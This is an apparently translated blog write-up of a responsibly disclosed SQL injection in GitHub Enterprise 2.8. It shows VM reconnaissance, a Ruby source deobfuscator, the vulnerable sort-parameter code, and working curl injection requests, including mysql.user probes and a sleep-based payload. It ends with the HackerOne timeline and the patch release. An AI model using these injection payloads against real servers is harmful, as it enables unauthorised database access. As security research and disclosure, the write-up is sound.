<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>SQL injection in GitHub Enterprise</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Hi Habr, 

 Below is the story by the author of Orange Tsai about how he purposefully searched for a vulnerability in the corporate version of GitHub ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>SQL injection in GitHub Enterprise</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/getpro/habr/post_images/305/b3d/022/305b3d0229e3ab7193765b327f114e88.png"><br><br>  Hi Habr, <br><br>  Below is the story by the author of Orange Tsai about how he purposefully searched for a vulnerability in the corporate version of GitHub and eventually discovered the possibility of SQL injection.  Here, on Habr√©, previously translated another of his article " <a href="https://habrahabr.ru/company/defconru/blog/282179/">How I hacked Facebook and found someone else's backdoor</a> ." <br><a name="habracut"></a><br><h1>  Before the start </h1><br>  GitHub Enterprise is a corporate version of GitHub.com, designed to deploy the GitHub platform in a private network for development.  Going to enterprise.github.com you can download a virtual machine (VM) with a free trial period of 45 days. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      After installation we will see: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/8e7/c4a/237/8e7c4a237a83347b958626bddf3f493f.png"><br><br><img src="https://habrastorage.org/getpro/habr/post_images/e36/cc7/273/e36cc72733ad1f5778f7919a9d29b5c3.png"><br><br>  Now, in my VM there is a complete GitHub ecosystem.  It's so interesting that I wanted to take a closer look at the VM: P. <br><br><h1>  Environment </h1><br>  The beginning of everything and everything is port scanning.  After calling the useful <b>Nmap</b> utility, you can see that 6 ports are open in the VM. <br><br><pre><code class="bash hljs">$ nmap -sT -vv -p 1-65535 192.168.187.145 ... PORT     STATE  SERVICE 22/tcp   open   ssh 25/tcp   closed smtp 80/tcp   open   http 122/tcp  open   smakynet 443/tcp  open   https 8080/tcp closed http-proxy 8443/tcp open   https-alt 9418/tcp open   git</code> </pre> <br>  After some analysis of the services, we can say that: <br><br><ul><li>  <b>22 / tcp</b> and <b>9418 / tcp</b> are similar to <b>haproxy</b> and redirect connections to the babeld <b>backend</b> service. <br></li><li>  <b>80 / tcp</b> and <b>443 / tcp</b> are basic GitHub services. <br></li><li>  <b>122 / tcp</b> - SSH service. <br></li><li>  <b>8443 / tcp</b> - GitHub management console. <br></li></ul><br>  By the way, the GitHub management console requires a password to log in.  If you have a password, you can add your SSH key and connect to the VM via <b>122 / tcp</b> . <br><br>  Using an SSH connection to a VM, we took a look at the entire system and the code base seems to be in the <b>/ data /</b> directory. <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment"># ls -al /data/ total 92 drwxr-xr-x 23 root              root              4096 Nov 29 12:54 . drwxr-xr-x 27 root              root              4096 Dec 28 19:18 .. drwxr-xr-x  4 git               git               4096 Nov 29 12:54 alambic drwxr-xr-x  4 babeld            babeld            4096 Nov 29 12:53 babeld drwxr-xr-x  4 git               git               4096 Nov 29 12:54 codeload drwxr-xr-x  2 root              root              4096 Nov 29 12:54 db drwxr-xr-x  2 root              root              4096 Nov 29 12:52 enterprise drwxr-xr-x  4 enterprise-manage enterprise-manage 4096 Nov 29 12:53 enterprise-manage drwxr-xr-x  4 git               git               4096 Nov 29 12:54 failbotd drwxr-xr-x  3 root              root              4096 Nov 29 12:54 git-hooks drwxr-xr-x  4 git               git               4096 Nov 29 12:53 github drwxr-xr-x  4 git               git               4096 Nov 29 12:54 git-import drwxr-xr-x  4 git               git               4096 Nov 29 12:54 gitmon drwxr-xr-x  4 git               git               4096 Nov 29 12:54 gpgverify drwxr-xr-x  4 git               git               4096 Nov 29 12:54 hookshot drwxr-xr-x  4 root              root              4096 Nov 29 12:54 lariat drwxr-xr-x  4 root              root              4096 Nov 29 12:54 longpoll drwxr-xr-x  4 git               git               4096 Nov 29 12:54 mail-replies drwxr-xr-x  4 git               git               4096 Nov 29 12:54 pages drwxr-xr-x  4 root              root              4096 Nov 29 12:54 pages-lua drwxr-xr-x  4 git               git               4096 Nov 29 12:54 render lrwxrwxrwx  1 root              root                23 Nov 29 12:52 repositories -&gt; /data/user/repositories drwxr-xr-x  4 git               git               4096 Nov 29 12:54 slumlord drwxr-xr-x 20 root              root              4096 Dec 28 19:22 user</span></span></code> </pre> <br>  Let's go to <b>/ data /</b> and try to look at the sources.  It seems they are coded :( <br><br><img src="https://habrastorage.org/getpro/habr/post_images/c99/4b5/74c/c994b574c43c6bdb2c8444d36918a42b.png"><br><br>  GitHub uses its own library for source code obfuscation.  If you search ‚Äúruby_concealer.so‚Äù in Google, you will find a kind person who wrote a <a href="https://gist.github.com/geoff-codes/02d1e45912253e9ac183">snippet</a> for deobfuscation. <br><br>  The snippet is obtained by simply replacing <b>rb_f_eval with</b> <b>rb_f_puts</b> in <b>ruby_concealer.so</b> and it works. <br><br>  But you can not be called a hacker, not understanding exactly how it works.  Therefore, we will open IDA Pro! <br><br><img src="https://habrastorage.org/getpro/habr/post_images/d43/24c/c39/d4324cc397d55d42a53276a4f8ef4a60.png"><br><br><img src="https://habrastorage.org/getpro/habr/post_images/ec3/c88/a32/ec3c88a32b581b12835cdc59990e0488.png"><br><br>  As you can see, Zlib :: Inflate :: inflate is used here for unpacking and XOR operations with the following key: <br><br><pre> <code class="markdown hljs">This obfuscation is intended to discourage GitHub Enterprise customers from making modifications to the VM. We know this 'encryption' is easily broken. []        GitHub Enterprise    VM.  ,   ""  .</code> </pre> <br>  So you can easily write your deobfuscator! <br><br><pre> <code class="ruby hljs"><span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">'zlib'</span></span> key = <span class="hljs-string"><span class="hljs-string">"This obfuscation is intended to discourage GitHub Enterprise customers from making modifications to the VM. We know this 'encryption' is easily broken. "</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">decrypt</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(s)</span></span></span></span>   i, plaintext = <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span>   Zlib::Inflate.inflate(s).each_byte <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> <span class="hljs-params"><span class="hljs-params">|c|</span></span>       plaintext &lt;&lt; (c ^ key[i%key.length].ord).chr       i += <span class="hljs-number"><span class="hljs-number">1</span></span>   <span class="hljs-keyword"><span class="hljs-keyword">end</span></span>   plaintext <span class="hljs-keyword"><span class="hljs-keyword">end</span></span> content = File.open(ARGV[<span class="hljs-number"><span class="hljs-number">0</span></span>], <span class="hljs-string"><span class="hljs-string">"r"</span></span>).read content.sub! <span class="hljs-string"><span class="hljs-string">%Q(require "ruby_concealer.so"\n__ruby_concealer__)</span></span>, <span class="hljs-string"><span class="hljs-string">" decrypt "</span></span> plaintext = eval content puts plaintext</code> </pre> <br><h1>  Code analysis </h1><br>  After deobfuscation, you can finally begin to review the code. <br><br><pre> <code class="bash hljs">$ cloc /data/  81267 text files.  47503 unique files.  24550 files ignored. http://cloc.sourceforge.net v 1.60  T=348.06 s (103.5 files/s, 15548.9 lines/s) ----------------------------------------------------------------------------------- Language                         files          blank        comment           code ----------------------------------------------------------------------------------- Ruby                             25854         359545         437125        1838503 Javascript                        4351         109994         105296         881416 YAML                               600           1349           3214         289039 Python                            1108          44862          64025         180400 XML                                121           6492           3223         125556 C                                  444          30903          23966         123938 Bourne Shell                       852          14490          16417          87477 HTML                               636          24760           2001          82526 C++                                184           8370           8890          79139 C/C++ Header                       428          11679          22773          72226 Java                               198           6665          14303          45187 CSS                                458           4641           3092          44813 Bourne Again Shell                 142           6196           9006          35106 m4                                  21           3259            369          29433 ...</code> </pre> <br><pre> <code class="hljs rust">$ ./bin/rake about About your application<span class="hljs-symbol"><span class="hljs-symbol">'s</span></span> environment Ruby version              <span class="hljs-number"><span class="hljs-number">2.1</span></span>.<span class="hljs-number"><span class="hljs-number">7</span></span> (x86_64-linux) RubyGems version          <span class="hljs-number"><span class="hljs-number">2.2</span></span>.<span class="hljs-number"><span class="hljs-number">5</span></span> Rack version              <span class="hljs-number"><span class="hljs-number">1.6</span></span>.<span class="hljs-number"><span class="hljs-number">4</span></span> Rails version             <span class="hljs-number"><span class="hljs-number">3.2</span></span>.<span class="hljs-number"><span class="hljs-number">22.4</span></span> JavaScript Runtime        Node.js (V8) Active Record version     <span class="hljs-number"><span class="hljs-number">3.2</span></span>.<span class="hljs-number"><span class="hljs-number">22.4</span></span> Action Pack version       <span class="hljs-number"><span class="hljs-number">3.2</span></span>.<span class="hljs-number"><span class="hljs-number">22.4</span></span> Action Mailer version     <span class="hljs-number"><span class="hljs-number">3.2</span></span>.<span class="hljs-number"><span class="hljs-number">22.4</span></span> Active Support version    <span class="hljs-number"><span class="hljs-number">3.2</span></span>.<span class="hljs-number"><span class="hljs-number">22.4</span></span> Middleware                GitHub::DefaultRoleMiddleware, Rack::Runtime, Rack::MethodOverride, ActionDispatch::RequestId, Rails::Rack::Logger, ActionDispatch::ShowExceptions, ActionDispatch::DebugExceptions, ActionDispatch::Callbacks, ActiveRecord::ConnectionAdapters::ConnectionManagement, ActionDispatch::Cookies, ActionDispatch::Session::CookieStore, ActionDispatch::Flash, ActionDispatch::ParamsParser, ActionDispatch::Head, Rack::ConditionalGet, Rack::ETag, ActionDispatch::BestStandardsSupport Application root          /data/github/<span class="hljs-number"><span class="hljs-number">9</span></span>fcdcc8 Environment               production Database adapter          githubmysql2 Database schema version   <span class="hljs-number"><span class="hljs-number">20161003225024</span></span></code> </pre> <br>  Most of the code is written in Ruby (Ruby on Rails and Sinatra). <br><br><ul><li>  <b>/ data / github /</b> apparently there is an application that works with ports <b>80 / tcp</b> , <b>443 / tcp</b> and it looks like the same code base as github.com, gist.github.com and api.github.com <br></li><li>  <b>/ data / render /</b> apparently code base render.githubusercontent.com <br></li><li>  <b>/ data / enterprise-manage / is</b> similar to an application that works with port <b>8443 / tcp</b> <br></li></ul><br>  To find out if the application works in enterprise mode, or in GitHub.com, does GitHub Enterprise use <b>enterprise</b> , respectively <b>?</b>  and <b>dotcom?</b>  . <br><br><h1>  Vulnerability </h1><br>  It took me about a week to find this vulnerability.  I am not familiar with Ruby, so I taught on the go, trying to write on it: P <br><br>  So, roughly speaking, my week has passed. <br><br><ul><li>  Day 1 - Install VM <br></li><li>  Day 2 - Install VM <br></li><li>  Day 3 - Learning Rails by analyzing the code <br></li><li>  Day 4 - Exploring Rails by Analyzing the Code <br></li><li>  Day 5 - Exploring Rails by Analyzing the Code <br></li><li>  Day 6 - And here I found SQL injection! <br></li></ul><br>  SQL injection was found in the <b>PreReceiveHookTarget</b> model. <br><br>  The root cause of the vulnerability lies in line 45 of the file <b>/data/github/current/app/model/pre_receive_hook_target.rb</b> . <br><br><pre> <code class="ruby hljs"><span class="hljs-number"><span class="hljs-number">33</span></span>   scope <span class="hljs-symbol"><span class="hljs-symbol">:sorted_by</span></span>, -&gt; (order, direction = <span class="hljs-literal"><span class="hljs-literal">nil</span></span>) { <span class="hljs-number"><span class="hljs-number">34</span></span>     direction = <span class="hljs-string"><span class="hljs-string">"DESC"</span></span> == <span class="hljs-string"><span class="hljs-string">"</span><span class="hljs-subst"><span class="hljs-string"><span class="hljs-subst">#{direction}</span></span></span><span class="hljs-string">"</span></span>.upcase ? <span class="hljs-string"><span class="hljs-string">"DESC"</span></span> : <span class="hljs-string"><span class="hljs-string">"ASC"</span></span> <span class="hljs-number"><span class="hljs-number">35</span></span>     select(&lt;&lt;-SQL) <span class="hljs-number"><span class="hljs-number">36</span></span>       <span class="hljs-comment"><span class="hljs-comment">#{table_name}.*, 37       CASE hookable_type 38         WHEN 'global'     THEN 0 39         WHEN 'User'       THEN 1 40         WHEN 'Repository' THEN 2 41       END AS priority 42     SQL 43       .joins("JOIN pre_receive_hooks hook ON hook_id = hook.id") 44       .readonly(false) 45       .order([order, direction].join(" ")) 46   }</span></span></code> </pre> <br>  Although Rails has a built-in ORM (called ActiveRecord), which is supposed to protect against SQL injection, its naive use can pose a threat. <br><br>  More examples are on <a href="http://rails-sqli.org/">Rails-sqli.org</a> .  I think it's useful to know about SQL injections in Rails. <br><br>  In this case, if we manage to change the <b>order</b> method parameter, we‚Äôll be able to implement a malicious SQL query. <br><br>  All right, now let's follow the challenges!  <b>sorted_by</b> is called in line 61 of the file <b>/data/github/current/app/api/org_pre_receive_hooks.rb</b> . <br><br><pre> <code class="ruby hljs"><span class="hljs-number"><span class="hljs-number">10</span></span>   get <span class="hljs-string"><span class="hljs-string">"/organizations/:organization_id/pre-receive-hooks"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> <span class="hljs-number"><span class="hljs-number">11</span></span>     control_access <span class="hljs-symbol"><span class="hljs-symbol">:list_org_pre_receive_hooks</span></span>, <span class="hljs-symbol"><span class="hljs-symbol">:org</span></span> =&gt; org = find_org! <span class="hljs-number"><span class="hljs-number">12</span></span>     @documentation_url &lt;&lt; <span class="hljs-string"><span class="hljs-string">"#list-pre-receive-hooks"</span></span> <span class="hljs-number"><span class="hljs-number">13</span></span>     targets = PreReceiveHookTarget.visible_for_hookable(org) <span class="hljs-number"><span class="hljs-number">14</span></span>     targets = sort(targets).paginate(pagination) <span class="hljs-number"><span class="hljs-number">15</span></span>     GitHub::PrefillAssociations.for_pre_receive_hook_targets targets <span class="hljs-number"><span class="hljs-number">16</span></span>     deliver <span class="hljs-symbol"><span class="hljs-symbol">:pre_receive_org_target_hash</span></span>, targets <span class="hljs-number"><span class="hljs-number">17</span></span>   <span class="hljs-keyword"><span class="hljs-keyword">end</span></span> ... <span class="hljs-number"><span class="hljs-number">60</span></span>   <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sort</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(scope)</span></span></span></span> <span class="hljs-number"><span class="hljs-number">61</span></span>     scope.sorted_by(<span class="hljs-string"><span class="hljs-string">"hook.</span><span class="hljs-subst"><span class="hljs-string"><span class="hljs-subst">#{params[</span></span><span class="hljs-symbol"><span class="hljs-string"><span class="hljs-subst"><span class="hljs-symbol">:sort</span></span></span></span><span class="hljs-string"><span class="hljs-subst">] </span></span><span class="hljs-params"><span class="hljs-string"><span class="hljs-subst"><span class="hljs-params">||</span></span></span></span><span class="hljs-string"><span class="hljs-subst"> </span></span><span class="hljs-string"><span class="hljs-string"><span class="hljs-subst"><span class="hljs-string">"id"</span></span></span></span><span class="hljs-string"><span class="hljs-subst">}</span></span></span><span class="hljs-string">"</span></span>, params[<span class="hljs-symbol"><span class="hljs-symbol">:direction</span></span>] <span class="hljs-params"><span class="hljs-params">||</span></span> <span class="hljs-string"><span class="hljs-string">"asc"</span></span>) <span class="hljs-number"><span class="hljs-number">62</span></span>   <span class="hljs-keyword"><span class="hljs-keyword">end</span></span></code> </pre> <br>  Note that <b>params [: sort]</b> is passed to <b>scope.sorted_by</b> .  So you can inject through <b>params [: sort]</b> . <br><br>  Before exploiting the vulnerability, you will need a valid <b>access_token</b> token with the <b>admin: pre_receive_hook parameter</b> to access the API.  Fortunately, it can be obtained using the command: <br><br><pre> <code class="bash hljs">$ curl -k -u <span class="hljs-string"><span class="hljs-string">'nogg:nogg'</span></span> <span class="hljs-string"><span class="hljs-string">'https://192.168.187.145/api/v3/authorizations'</span></span> \ -d <span class="hljs-string"><span class="hljs-string">'{"scopes":"admin:pre_receive_hook","note":"x"}'</span></span> { <span class="hljs-string"><span class="hljs-string">"id"</span></span>: 4, <span class="hljs-string"><span class="hljs-string">"url"</span></span>: <span class="hljs-string"><span class="hljs-string">"https://192.168.187.145/api/v3/authorizations/4"</span></span>, <span class="hljs-string"><span class="hljs-string">"app"</span></span>: {   <span class="hljs-string"><span class="hljs-string">"name"</span></span>: <span class="hljs-string"><span class="hljs-string">"x"</span></span>,   <span class="hljs-string"><span class="hljs-string">"url"</span></span>: <span class="hljs-string"><span class="hljs-string">"https://developer.github.com/enterprise/2.8/v3/oauth_authorizations/"</span></span>,   <span class="hljs-string"><span class="hljs-string">"client_id"</span></span>: <span class="hljs-string"><span class="hljs-string">"00000000000000000000"</span></span> }, <span class="hljs-string"><span class="hljs-string">"token"</span></span>: <span class="hljs-string"><span class="hljs-string">"????????"</span></span>, <span class="hljs-string"><span class="hljs-string">"hashed_token"</span></span>: <span class="hljs-string"><span class="hljs-string">"1135d1310cbe67ae931ff7ed8a09d7497d4cc008ac730f2f7f7856dc5d6b39f4"</span></span>, <span class="hljs-string"><span class="hljs-string">"token_last_eight"</span></span>: <span class="hljs-string"><span class="hljs-string">"1fadac36"</span></span>, <span class="hljs-string"><span class="hljs-string">"note"</span></span>: <span class="hljs-string"><span class="hljs-string">"x"</span></span>, <span class="hljs-string"><span class="hljs-string">"note_url"</span></span>: null, <span class="hljs-string"><span class="hljs-string">"created_at"</span></span>: <span class="hljs-string"><span class="hljs-string">"2017-01-05T22:17:32Z"</span></span>, <span class="hljs-string"><span class="hljs-string">"updated_at"</span></span>: <span class="hljs-string"><span class="hljs-string">"2017-01-05T22:17:32Z"</span></span>, <span class="hljs-string"><span class="hljs-string">"scopes"</span></span>: [   <span class="hljs-string"><span class="hljs-string">"admin:pre_receive_hook"</span></span> ], <span class="hljs-string"><span class="hljs-string">"fingerprint"</span></span>: null }</code> </pre> <br>  After receiving the token, you can take advantage of the vulnerability as follows: <br><br><pre> <code class="bash hljs">$ curl -k -H <span class="hljs-string"><span class="hljs-string">'Accept:application/vnd.github.eye-scream-preview'</span></span> \ <span class="hljs-string"><span class="hljs-string">'https://192.168.187.145/api/v3/organizations/1/pre-receive-hooks?access_token=????????&amp;sort=id,(select+1+from+information_schema.tables+limit+1,1)'</span></span> [ ] $ curl -k -H <span class="hljs-string"><span class="hljs-string">'Accept:application/vnd.github.eye-scream-preview'</span></span> \ <span class="hljs-string"><span class="hljs-string">'https://192.168.187.145/api/v3/organizations/1/pre-receive-hooks?access_token=????????&amp;sort=id,(select+1+from+mysql.user+limit+1,1)'</span></span> { <span class="hljs-string"><span class="hljs-string">"message"</span></span>: <span class="hljs-string"><span class="hljs-string">"Server Error"</span></span>, <span class="hljs-string"><span class="hljs-string">"documentation_url"</span></span>: <span class="hljs-string"><span class="hljs-string">"https://developer.github.com/enterprise/2.8/v3/orgs/pre_receive_hooks"</span></span> } $ curl -k -H <span class="hljs-string"><span class="hljs-string">'Accept:application/vnd.github.eye-scream-preview'</span></span> \ <span class="hljs-string"><span class="hljs-string">'https://192.168.187.145/api/v3/organizations/1/pre-receive-hooks?access_token=????????&amp;sort=id,if(user()="github@localhost",sleep(5),user()) {   ... }</span></span></code> </pre> <br><img src="https://habrastorage.org/files/112/35b/d28/11235bd2862d4121b89d96a7b1eab0e1.png"><br><br><h1>  Chronology </h1><br><ul><li>  12/26/2016 5:48 GitHub vulnerability report via HackerOne. <br></li><li>  12/26/2016 08:39 GitHub confirms the existence of the problem and is working to fix it. <br></li><li>  12/26/2016 3:48 PM Reporting the details of the vulnerability. <br></li><li>  12/28/2016 2:44 AM GitHub responds that the vulnerability will be removed in the next version of GitHub Enterprise. <br></li><li>  01/04/2017 06:41 GitHub offers a reward of $ 5,000. <br></li><li>  01/05/2017 02:37 I ask whether you can write about this in a blog. <br></li><li>  01/05/2017 03:06 GitHub kindly allows you to talk about it. <br></li><li>  01/05/2017 07:06 GitHub Enterprise version 2.8.5 release! <br></li></ul></div><p>Source: <a href="https://habr.com/ru/post/319786/">https://habr.com/ru/post/319786/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../319774/index.html">IDEA is time to dig in?</a></li>
<li><a href="../319776/index.html">How can a company pay 133 times less taxes</a></li>
<li><a href="../319780/index.html">JetBrains master class on C ++ Russia 2017</a></li>
<li><a href="../319782/index.html">Study of image segmentation methods</a></li>
<li><a href="../319784/index.html">I work at the Deutsche Bank TechCenter</a></li>
<li><a href="../319788/index.html">Release FFCMS 3.0.0 - a new recycled system</a></li>
<li><a href="../319790/index.html">Recursion Quick look</a></li>
<li><a href="../319794/index.html">Grouping alerts in Android 7</a></li>
<li><a href="../319796/index.html">Episode 3 - a new hope for the success of the game for Android</a></li>
<li><a href="../319798/index.html">Why do people play games</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>